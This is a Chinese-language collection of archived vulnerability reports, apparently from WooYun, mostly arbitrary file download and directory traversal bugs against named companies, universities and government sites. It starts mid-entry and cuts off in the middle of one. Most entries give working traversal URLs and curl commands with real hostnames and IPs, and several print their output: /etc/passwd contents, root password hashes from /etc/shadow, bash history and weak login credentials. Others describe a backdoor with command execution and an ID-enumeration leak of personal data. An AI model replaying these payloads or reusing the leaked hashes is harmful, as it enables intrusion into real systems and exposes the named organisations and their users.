**详情**: curl http://122.228.73.217:8081/../../../../../../../../etc/shadowroot:$6$HsBNvUFk$OBVBzkLslX.mpswLYU4YWj7t8V9JcRHKeH0Db4BLWxiyL6M1BRk.SHizjqkO08bV8dODifCjmToxn56TXSTNR/:16808:0:99999:7:::bin:*:15980:0:99999:7:::daemon:*:15980:0:99999:7:::adm:*:15980:0:99999:7:::lp:*:15980:0:99999:7:::sync:*:15980:0:99999:7:::shutdown:*:15980:0:99999:7:::halt:*:15980:0:99999:7:::mail:*:15980:0:99999:7:::uucp:*:159

**POC**: /root/.bash_historyvim zabbix_agentd.confkillall -9 zabbix_agentd/usr/local/sbin/zabbix_agentdLANG=en_US.UTF-8;clearping 192.168.1.19LANG=en_US.UTF-8;clearps aux | grep mysqlcat /etc/my.cnfdf -hcd /llcd /hxapp/llLANG=en_US.UTF-8;clearvim /etc/zabbix/zabbix_agentd.confps uax | grep zabbix_agentdkilla

**绕过**: 直接利用

**修复**: 中间件配置
---

---
### [wooyun-2015-0163358] 艾瑞集团CRM办公系统遍历目录及文件下载
**厂商**: iresearch.com.cn | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网址：http://crm.iresearch.com.cn/login.aspx网站代码及日常办公文件（2011年-至今 合同、报价单等重要资讯）

**POC**: 网站代码：文件遍历下载：2011-2015upload文件合同文件：项目预算计划报价:其它蛮多资料的：

**绕过**: 直接利用

**修复**: 权限
---

---
### [wooyun-2013-024162] 全国大学生信息安全竞赛网任意文件下载漏洞（可读shadow）
**厂商**: 全国大学生信息安全竞赛网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可以下载shadow passwd等系统文件，有可能被直接提取服务器的可能http://ciscn.cn/jsp/index/downFile.jsp?filename=/../..//../..//../..//../..//../..//etc/shadow

**POC**: curl "http://ciscn.cn/jsp/index/downFile.jsp?filename=/../..//../..//../..//../..//../..//etc/shadow"root:$6$ySYwDfU5Z/ZNQcYN$7XNWIgzcfeDuCoRVXGEYslVYw1/WB480TLjUnKw4kM6eQ8gO82w9o/drUHVlIyvmsjfI1NDW2kELMQFQOPAbI/:15737:0:99999:7:::bin:*:15155:0:99999:7:::daemon:*:15155:0:99999:7:::adm:*:15155:0:9999

**绕过**: 直接利用

**修复**: 自己扒开源码看。。
---

---
### [wooyun-2015-0123550] 中兴通讯某站疑似后门导致服务器沦陷
**厂商**: 中兴通讯股份有限公司 | **年份**: 2015 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点：http://www.ztekj.com/之前爆过目录遍历：http://wooyun.org/bugs/wooyun-2010-041699翻翻目录，居然发现了一个应用部署在上面：访问，发现居然是一个后门，http://www.ztekj.com/deploy/management/console.war/jsp_info.jsp，可以执行命令：居然是system权限：

**POC**: 直接添加了一个webuser用户上去了，请自行删除用户：

**绕过**: 直接利用

**修复**: 1.以前的遍历漏洞都不修复的2.删除后门呀3.看看中间件是不是有漏洞呀
---

---
### [wooyun-2015-0147647] 悟空CRM系统后门导致未授权访问公司内部文件
**厂商**: 郑州卡卡罗特软件科技有限公司 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官方提供给客户使用的安装包在目录下有读取上传文件的接口http://www.jinch-home.com//Public/js/php/file_manager_json.phphttp://www.banchang.cc/Public/js/php/file_manager_json.php传入相应参数可遍历该目录下的用户文件Uploads/201405/27/目录下含有53843caa70189.xls 53846c2141f31.doc等文件下载后发现是报价单

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 官方应该知道的
---

---
### [wooyun-2013-046208] onlylady女人志任意文件读取漏洞
**厂商**: onlylady女人志 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://pic.onlylady.com/files/download.php?file=../../../../../../../../etc/passwd读出/erc/passwd了里面美图真的很多啊。root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:

**POC**: 同上附上漏洞代码 download.php<?phpdefine ('ONLYLADY', true);require '../../include/myfunc.php';$_GET=daddslashes($_GET);$filename = $_GET['file'];$key = explode('/',$filename);$name = explode('.',$key[count($key)-1]);//文件的类型header('Content-type: application/jpeg');//下载显示的名字header('Content-Disposition: attac

**绕过**: 直接利用

**修复**: 这个程序员要打屁屁
---

---
### [wooyun-2015-0101259] 某教育信息系统任意文件下载漏洞
**厂商**: 浙江浙大万朋软件有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 浙大万鹏通用教育信息系统任意文件下载漏洞浙江浙大万朋软件有限公司 http://www.zdsoft.net/典型用户http://www.zdsoft.net/moreinfo.aspx?layoutTemplateId=1201&bigClassId=266571任意文件下载链接： /cnet/filemanager/fileMgrProxy.down

**POC**: 测试案例：山东省广饶县教育局http://www.grjy.net:81/cnet/任意文件下载：http://www.grjy.net:81/cnet/filemanager/fileMgrProxy.down?method=download&domesticfile=WEB-INF/web.xml其他案例：http://222.132.49.180:82/cnet/filemanager/fileMgrProxy.down?method=download&domesticfile=WEB-INF/web.xmlhttp://www.ymedu.gov.cn/cnet/filemanager

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0129390] 某物流仓储管理系统互联网客户服务平台越权漏洞&默认文件下载
**厂商**: 宁波市江东英赛特软件有限公司 | **年份**: 2015 | **类型**: 默认配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 默认配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别默认配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某物流仓储管理系统互联网客户服务平台越权漏洞&默认文件下载。案例：http://**.**.**.**:81/http://**.**.**.**/http://**.**.**.**/**.**.**.**/**.**.**.**/http://**.**.**.**/

**POC**: 1.越权漏洞http://**.**.**.**/gjdcx/gsxxbj.asphttp://**.**.**.**/gjdcx/ljsz.asphttp://**.**.**.**/gjdcx/cxsz.asphttp://**.**.**.**/gjdcx/yhgl.asphttp://**.**.**.**/gjdcx/yhglxz.asp漏洞证明：2.默认文件下载：（里面是数据库文件）http://**.**.**.**:81/database/insightweb.rarhttp://**.**.**.**/database/insightweb.rarhttp://**.**.*

**绕过**: 直接利用

**修复**: ...
---

---
### [wooyun-2015-0141630] 时趣互动某漏洞可泄露数十万数据引发蝴蝶效应
**厂商**: social-touch.com | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上次提交的第一个漏洞，说好的小礼物都不给我！这次再来一个大点的。源于某处配置不当，导致目录遍历，可下载备份文件，内含大量敏感信息，包括不限于用户姓名/密码/家庭住址/联系方式!还有驴妈妈和新浪的一些信息，包括众多个人微信的案例!0x00:起初，由于未授权访问引起：http://api.social-touch.com/log/ 上级目录不重要，重要的就是备份的1.5G的文件大图来了：由于信息量过大，只能点到为止！因此分为四个部分一一列举出部分重点：第一部分：用户数十万详细信息信息包括：会员等级/新老会员/会员姓名/联系方式/家庭住址/消费途径……各种，看表头，以下四张表不同的，每张数据量过万！！*路径下所针对文件夹内月份销售以及赠送详细信息 #由于Excel文档用户数据过多，单个文件已经不能用用户量表示，直接用大小吧。月份allmember_info 28MB！第二部分:详细过万物流信息+

**POC**: 第三部分：用户登陆设备敏感信息，我们发现了大量的微信请求。包括微信账户信息，地址等敏感信息第四部分：驴妈妈以及新浪的一些请求等再赠一个：大量的crocs_info/系统配置随便贴出一个Crocs_info：2015/07/13 08:06:35  array ('flag' => 0,'data' => 'lack of openid','openId' => '','info' => '','func' => 'getrelation',)2015/07/13 08:06:35  array ('flag' => 0,'data' => 'lack of openid','openId' =

**绕过**: 直接利用

**修复**: 已经第二发了，我是来找礼物的！
---

---
### [wooyun-2015-0157515] 智联招聘某分站任意文件下载导致敏感信息泄露
**厂商**: 智联招聘 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看到别人提交了。自己也发个http://service.zhaopin.com/live800/downlog.jsp?path=/&fileName=/etc/hosts

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0112986] EdmWebVideo录像监控系统任意文件遍历
**厂商**: EdmWebVideo | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于没充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。无需登录情况任意遍历系统文件下载（以windwos文件夹内文件为例）

**POC**: http://地址/../../../../../../../../WINDOWS/system32/drivers/etc/hosts案例：http://219.159.186.202:82/http://221.4.254.10:82/http://218.24.78.158/http://183.63.58.130/http://124.192.202.137/http://219.233.182.202/http://113.107.171.70:81/http://59.124.168.19/http://yihaozhanting.vs98.com/http://wanshunda

**绕过**: 直接利用

**修复**: 你们懂的。不懂请百度。
---

---
### [wooyun-2013-040047] trs某系统任意文件下载漏洞第二弹
**厂商**: 北京拓尔思信息技术股份有限公司 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: expinforadar/jsp/util/file_download.jsp?filePath=../../../../../../../etc/passwdexp2http://inforadar.trs.com.cn/jsp/util/file_download.jsp?filePath=c:%5Cboot.ini%00.xml官方网站需要加个截断，就可以了应该是神马雷达系统。很多地方都有这问题。但是google找不到多少个，因为很多都是二次开发，目录明改变了。比如招行。。。WooYun: 招商银行某系统任意文件下载漏洞googlehttp://203.208.46.145/#newwindow=1&q=intitle:trs+inurl:inforadar&start=10http://203.208.46.145/#filter=0&newwindow=1&q=inurl:jsp

**POC**: WooYun: 招商银行某系统任意文件下载漏洞WooYun: 福建省人民政府某系统任意文件下载漏洞trs官方[boot loader]timeout=30default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS[operating systems]multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Windows Server 2003, Enterprise" /noexecute=optout /fastdetect貌似windows的boot.ini都一样 官方用的是2003系统。。

**绕过**: 截断攻击

**修复**: 正则过滤下呗，然后限制下访问文件类型。
---

---
### [wooyun-2014-061149] Anymacro 邮件系统登陆状态任意文件下载漏洞（读取源码以及邮件内容）
**厂商**: 北京安宁创新网络科技有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 乌云已经把它列入到通用型奖励厂商当中了。0x01 北京anymacro是国内较流行的一家企业级邮箱系统，客户主要为教育/政府机构。其中涉及客户较多。从官网确认以下受影响：运营级系统中华人民共和国商务部河北省网通黑龙江省网通内蒙古自治区铁通抚顺市网通企业级系统苏宁电器集团中远房地产邯郸钢铁集团铜牛针织集团校园级系统北京邮电大学中国人民大学东北大学南昌大学电 子 政 务中国政协济南市政府天津市公安局河北省高级人民法院市民信箱系统青岛市东营市石家庄市宝鸡市0x02 漏洞分析：给2个案例http://webmail.vanceinfo.comhttp://sut.edu.cn在根目录当中domain_sign.phprequire_once "config/config.php";require_once "include/template.php";require_once "include/f

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-064637] PHPYUN最新版任意文件读取漏洞
**厂商**: php云人才系统 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 刚刚研究了下二哥的XML实体注入：WooYun: 百度某功能XML实体注入感觉好高大上哦，从来没遇到过，这几天看PHPYUN，突然想到了这个问题。文件weixin/model/index.class.phppublic function index_action(){if($_GET["echostr"]){$this->valid();}else{if(!$this->checkSignature()){echo "非法来源地址！";exit();};$postStr = $GLOBALS["HTTP_RAW_POST_DATA"];if (!empty($postStr)){$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);$fromUsername = $postObj->Fr

**POC**: 读取/phpyun/robots.txt内容发送请求：POST /phpyun/weixin/index.php?m=index&c=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accep

**绕过**: 直接利用

**修复**: 默认安装时加上随机wx_token，或者处理输入的内容。
---

---
### [wooyun-2015-0131306] 电信某站存在目录遍历漏洞可查看服务器敏感信息
**厂商**: 中国电信股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国电信天翼RTC：http://www.chinartc.com/存在目录遍历漏洞，可以查看到服务上的敏感信息

**POC**: 遍历点：http://www.chinartc.com/dev/downloadman/downloadFile.do?newfilename=%E5%A4%A9%E7%BF%BCRTC%20SDK%E5%BC%80%E5%8F%91%E6%89%8B%E5%86%8C%20for%20Android.pdf&filename=../../../../../../../../../../../../../sbin/../etc/passwd可看到pwd的内容在burp里加上路径字典跑一发，跑出很多配置信息httpd.conf相关信息系统协议配置信息环境变量配置信息网络配置信息

**绕过**: 直接利用

**修复**: 做好目录的权限限制
---

---
### [wooyun-2015-093845] 某通用型电商系统任意文件下载漏洞(系统权限)
**厂商**: CnCert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 乌云主站搜索了下"浪潮"，他们忽略了好多漏洞，望管理员把该漏洞提交给 cncert国家互联网应急中心 来处理吧。:P----------------------------------------相关厂商：浪潮相关域名：http://www.inspur.com/漏洞链接：http://www.website.com/DocCenterService/image?photo_size=&photo_id=1漏洞参数：photo_size漏洞说明：首先确保photo_id的数字对应的图片存在，之后修改photo_size的值导致下载任意文件（包括passwd、shadow、还有各类敏感配置文件）----------------------------------------以浪潮官方为例：链接分别为：http://shop.inspur.com/ecweb/bj/http://shop.in

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0141978] 锐捷子网站目录遍历造成信息泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网址：http://**.**.**.**/遍历目录：http://**.**.**.**/xml/http://**.**.**.**https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/upimg/http://**.**.**.**/include/http://**.**.**.**/download/http://**.**.**.**/data/

**POC**: http://**.**.**.**/include/http://**.**.**.**/download/http://**.**.**.**/data/http://**.**.**.**/xml/

**绕过**: 直接利用

**修复**: 设置权限
---

---
### [wooyun-2015-0155684] 武汉市某医院系统某数据查询接口导致大量用户隐私信息泄露
**厂商**: 武汉市第一医院 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这次更加明确判断，此服务器应该是支付宝用户信息接口数据服务器了。

**POC**: 给个链接先：**.**.**.**/alipay/bangdingshenqing/personal_info.php?Id=12450注意：会跳转到支付宝登录界面，需要先支付宝账号登录授权后才行登录后就看到了一开始以为只能看自己的，后来发现可以遍历。恶意用户可以脱裤了。亲！！！修改ID参数值：**.**.**.**//alipay/bangdingshenqing/personal_info.php?Id=12445本人绝逼没脱裤啊，只是把漏洞告诉你们。

**绕过**: 直接利用

**修复**: 做好权限控制，单个用户只能查自己的信息。还有，不要把身份证、手机号写那么清楚，中间加点*隐藏掉一些嘛。好没安全感，扫号的最喜欢这种明文全展示的。
---

---
### [wooyun-2014-080819] 内蒙古自治区多个市存在任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 义乌市行政服务中心http://www.yw365.gov.cn:9999/admin/downLoadGonggaoAtta.action?filePath=C%3a%5cwindows%5csystem32%5cdrivers%5cetc%5chosts&fileName=1.txt阿拉善盟政务服务中心http://www.alsxzsp.gov.cn/htmlylc/downLoadGonggaoAtta.action?filePath=C%3a%5cwindows%5csystem32%5cdrivers%5cetc%5chosts&fileName=1.txt呼和浩特市政务服务中心http://www.zwfw.gov.cn/1664zwts/downLoadGonggaoAtta.action?filePath=C%3a%5cwindows%5csystem32%5cdrive

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们懂的。。
---

---
### [wooyun-2012-014946] 风行分站任意文件下载漏洞
**厂商**: 北京风行在线技术有限公司 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 风行安装文件下载地址你懂的。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 从coder的意识上开始修复 。。
---

---
### [wooyun-2015-0104906] 中国诚商网存在任意文件下载
**厂商**: 中国诚商网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://china.trade2cn.com/download.jsp?path=/../../../../../..//etc/passwd由于代码中存在如下逻辑，导致可以进行越权遍历：org.apache.jasper.JasperException: An exception occurred processing JSP page /download.jsp at line 74: 	 int i = 0;5:     response.setContentType("application/octet-stream");6:     response.setHeader("Content-Disposition","attachment;filename = "+paths[paths.length-1]);7:     java.io.FileInputStream fi

**POC**: http://china.trade2cn.com/download.jsp?path=/../../../../../..//etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:sh

**绕过**: 直接利用

**修复**: 对下载路径进行限制，过滤path中的关键字，并对字符串拼接的下载路径进行校验
---

---
### [wooyun-2015-0127032] 和讯网某分站任意文件读取
**厂商**: 和讯网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: focus.stock.hexun.com/struts/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd存在任意文件遍历读取，使用burp抓包，返回passwd文件内容返回issue文件内容

**POC**: focus.stock.hexun.com/struts/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd存在任意文件遍历读取，使用burp抓包，返回passwd文件内容返回issue文件内容

**绕过**: 直接利用

**修复**: 过滤一下
---

---
### [wooyun-2015-096244] 广州大学任意文件包含漏洞
**厂商**: 广州大学 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 最近写了一个文件包含的测试的脚本,就想验证一下.就拿你作测试了.^-^以后再也不怕你把它藏得再深了.测试脚本：https://github.com/KaiyiZhang/Secipt/blob/master/LFI.TESTER.py写的比较拙劣,讲究可以用.测试URL:http://xsc.gzhu.edu.cn/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这个一搜一大把的.
---

---
### [wooyun-2013-020363] 北京电影学院教务系统多漏洞导致演员信息泄露（某个妹子，你懂的！）
**厂商**: 北京电影学院 | **年份**: 2013 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 认证接口

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本次测试借鉴了以下漏洞，感谢@牛博恩 @灰色帽子 @prolog 以及其他作者：方正教务系统sql注射（为啥是方正..）WooYun: 正方教务系统sql注射以及设计缺陷正方教务系统低版本爆提权漏洞WooYun: 正方教务系统低版本爆提权漏洞正方教务管理系统敏感记录文件下载WooYun: 正方教务管理系统敏感记录文件下载众所周知正方的洞很多，但是可能大部分学生信息都没有特别大的价值。但是这次是北影不得不爆，妹子，你懂的！1.首先查阅了近期的正方漏洞，测试了一下，北影的系统，参考这个（(WooYun: 正方教务系统低版本爆提权漏洞)）找到一个帐户名，然后存在注入（WooYun: 正方教务系统sql注射以及设计缺陷），然后构造进行注入。2.然后发现正方的表名的确是很凌乱，拼音+英文缩写，没什么规则，很烂3.然后想办法得到了北影的学号分布，之后burp，跑出一个弱口令4.之后登陆，改一下密码，再

**POC**: 见上面的截图.

**绕过**: 直接利用

**修复**: 你懂的！
---

---
### [wooyun-2014-068417] 某多省政府在用监测平台存在任意文件下载漏洞和一处越权操作
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 开发公司：北京思路创新科技有限公司程序名称：重点监控企业环境信息公开平台漏洞类型：任意文件下载漏洞文件：filedownload.action?inputPath=是否需要登录：否关键字：inurl:enterprise-info!getCompanyInfo.action搜索了几个用户用作演示：四川省重点监控企业污染源监测信息公开平台http://www.schj.gov.cn/wryjcxx/filedownload.action?inputPath=upfile/../WEB-INF/web.xml&inputName=web.xml新疆维吾尔自治区重点监控企业环境信息发布平台http://www.xjmic.com/enterprisemonitor/filedownload.action?inputPath=upfile/../WEB-INF/web.xml&inputName=

**POC**: ####另外一处越权，不需要登录，可以直接读取、修改其他用户信息（包括密码），只对注册用户有效，对管理员无效。####漏洞文件：register/EditPage.jsp?uid=注册用户的uid遍历即可查看其他用户的信息http://182.148.109.184/register/EditPage.jsp?uid=himan   （himan是我注册的）测试存在test用户：http://182.148.109.184/register/EditPage.jsp?uid=test可修改信息和密码：

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0139288] 宜安延保管理系统目录遍历源码下载
**厂商**: 深圳市宜安延保售后管理股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站：**.**.**.**/index.php问题1： 目录遍历导致重要信息泄露例如：**.**.**.**/download/**.**.**.**/delete**.**.**.**/guide/rudan问题2：网站源码下载：**.**.**.**/delete/cqlt.rar 源码下载wenti3：用户名使用弱口令，可爆破：例如账户：bantian01   密码 888888重要的合同之类的都可以下载到 看到是和联通营业厅有合作关系。

**POC**: 弱口令。账户可爆破目录遍历信息泄露3389端口可外网直连

**绕过**: 直接利用

**修复**: 主机加固
---

---
### [wooyun-2015-0119006] 当当网某站配置不当泄漏代码或者进一步利用等风险
**厂商**: 当当网 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 上传功能

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 当当豆瓜http://doogua.dangdang.com/http://doogua.dangdang.com/f.php扫到一个文件有3个功能 上传、压缩、显示所有文件泄露所有文件而且存在目录遍历利用压缩功能打包代码下载到本地审计了下上传那个文件 不知道为什么上传不了 太蠢了memcache   http://doogua.dangdang.com/memcache.phpvea 123456这f.php文件 是开发使用的么 放到web太冒险了

**POC**: 当当豆瓜http://doogua.dangdang.com/http://doogua.dangdang.com/f.php扫到一个文件有3个功能 上传、压缩、显示所有文件泄露所有文件而且存在目录遍历利用压缩功能打包代码下载到本地审计了下上传那个文件 不知道为什么上传不了 太蠢了memcache   http://doogua.dangdang.com/memcache.phpvea 123456这f.php文件 是开发使用的么 放到web太冒险了

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0158541] 迅雷某站任意文件读取漏洞
**厂商**: 迅雷 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operat

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-092726] 蘑菇街某服务器任意文件读取(包括root hash)
**厂商**: 蘑菇街 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: [root@localhost tmp]# curl 117.121.133.42/../../../../../../../../../../../../../../../../../etc/shadowroot:$6$VFf/m0um$vq.ruj9SoNJQG7KIUmWLCdi8RYjSu.USYygQCd0aXjUkDwoi2t9ACzEN9RM7IKoJ4BIQQ5AvJFgsfQ.6LNYtY.:16139:0:99999:7:::bin:*:15628:0:99999:7:::daemon:*:15628:0:99999:7:::adm:*:15628:0:99999:7:::lp:*:15628:0:99999:7:::sync:*:15628:0:99999:7:::shutdown:*:15628:0:99999:7:::halt:*:15628:0:99999:7:

